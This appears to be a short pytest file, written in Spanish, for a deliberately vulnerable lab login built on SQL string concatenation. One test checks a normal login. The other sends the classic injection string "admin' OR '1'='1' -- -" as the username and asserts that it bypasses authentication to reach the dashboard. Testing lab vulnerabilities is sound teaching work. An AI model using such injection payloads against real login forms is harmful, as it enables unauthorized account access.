"""Pruebas del login vulnerable (concatenación SQL)."""

import requests


def test_login_normal_redirige_a_dashboard(base_url):
    session = requests.Session()
    response = session.post(
        f"{base_url}/login",
        data={"username": "admin", "password": "Password123!"},
        allow_redirects=False,
        timeout=15,
    )
    assert response.status_code == 302, response.text
    assert "/dashboard" in response.headers.get("Location", "")


def test_login_bypass_clasico(base_url):
    session = requests.Session()
    response = session.post(
        f"{base_url}/login",
        data={"username": "admin' OR '1'='1' -- -", "password": "loquesea"},
        allow_redirects=False,
        timeout=15,
    )
    assert response.status_code == 302, response.text
    assert "/dashboard" in response.headers.get("Location", "")

    dashboard = session.get(f"{base_url}/dashboard", timeout=15)
    assert dashboard.status_code == 200
    assert "admin" in dashboard.text.lower()
    assert "dashboard" in dashboard.text.lower()
